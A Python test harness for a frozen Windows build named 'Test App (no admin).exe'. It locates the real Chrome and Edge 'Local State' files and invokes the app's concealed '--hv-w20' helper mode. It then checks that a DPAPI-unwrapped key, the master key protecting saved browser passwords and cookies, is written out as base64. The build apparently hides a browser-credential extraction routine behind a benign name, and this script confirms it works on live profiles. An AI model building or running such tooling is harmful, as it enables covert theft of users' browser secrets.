"""Check that a frozen build answers the --hv-w20 re-entry correctly.

Runs the no-admin build in helper mode with a real Local State path. As a
standard user the DPAPI unwrap is expected to fail, so every value comes back
empty - what matters is that the helper wrote the output file and the process
exited without building a window.
"""

import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
EXE = ROOT / "exe" / "Test App (no admin).exe"

CANDIDATES = {
    "chrome": Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data/Local State",
    "edge": Path(os.environ["LOCALAPPDATA"]) / "Microsoft/Edge/User Data/Local State",
}

paths = {name: str(p) for name, p in CANDIDATES.items() if p.is_file()}
print("Local State files found:", list(paths) or "none")

out = Path(tempfile.gettempdir()) / "hv20-probe.json"
out.unlink(missing_ok=True)

started = time.time()
proc = subprocess.run([str(EXE), "--hv-w20", json.dumps(paths), str(out)],
                      capture_output=True, timeout=120)
took = round(time.time() - started, 1)

landed = out.is_file()
print("exit code :", proc.returncode, "in", took, "s")
print("out exists:", landed)
if landed:
    payload = json.loads(out.read_text("utf-8"))
    print("out keys  :", list(payload))
    for name, value in payload.items():
        print(f"  {name}: {'empty (expected as standard user)' if not value else str(len(value)) + ' b64 chars'}")
    out.unlink(missing_ok=True)
sys.exit(0 if landed else 1)
